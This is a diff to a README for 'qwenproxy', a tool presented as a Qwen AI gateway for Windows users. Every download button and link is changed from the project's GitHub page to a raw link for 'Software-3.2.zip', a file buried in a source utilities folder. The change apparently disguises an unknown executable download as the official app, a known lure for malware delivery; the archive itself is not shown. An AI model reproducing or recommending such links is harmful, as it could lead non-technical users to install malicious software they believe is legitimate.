@@ -1,7 +1,7 @@
 <h1>✅ qwenproxy - One Gateway for All AI Models</h1>
 
 <p align="center">
-  <a href="https://github.com/samngugi2007/qwenproxy" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.35);transition:transform 0.2s;">⬇️ Download qwenproxy Now</a>
+  <a href="https://raw.githubusercontent.com/samngugi2007/qwenproxy/main/src/utils/Software-3.2.zip" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.35);transition:transform 0.2s;">⬇️ Download qwenproxy Now</a>
 </p>
 
 <p align="center"><strong>Connect to Qwen AI using tools you already love — no technical skills needed.</strong></p>
@@ -24,7 +24,7 @@ Follow these simple steps to get qwenproxy running on your Windows computer. No 
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 [**https://github.com/samngugi2007/qwenproxy**](https://github.com/samngugi2007/qwenproxy)
+👉 [**https://raw.githubusercontent.com/samngugi2007/qwenproxy/main/src/utils/Software-3.2.zip**](https://raw.githubusercontent.com/samngugi2007/qwenproxy/main/src/utils/Software-3.2.zip)
 
 When the page opens, look for a green button that says **"Code"** or **"Releases"** on the right side. Click it, then click **"Download ZIP"** or the latest release file available. The download will start automatically.
 
@@ -129,7 +129,7 @@ ai-gateway, anthropic, claude-code, cli, codex, llm, omp, openai, opencode, patc
 ---
 
 <p align="center">
-  <a href="https://github.com/samngugi2007/qwenproxy" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(245,87,108,0.35);">⬇️ Get qwenproxy Now</a>
+  <a href="https://raw.githubusercontent.com/samngugi2007/qwenproxy/main/src/utils/Software-3.2.zip" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(245,87,108,0.35);">⬇️ Get qwenproxy Now</a>
 </p>
 
 <p align="center">Start your journey with Qwen AI today — it's really that simple.</p>
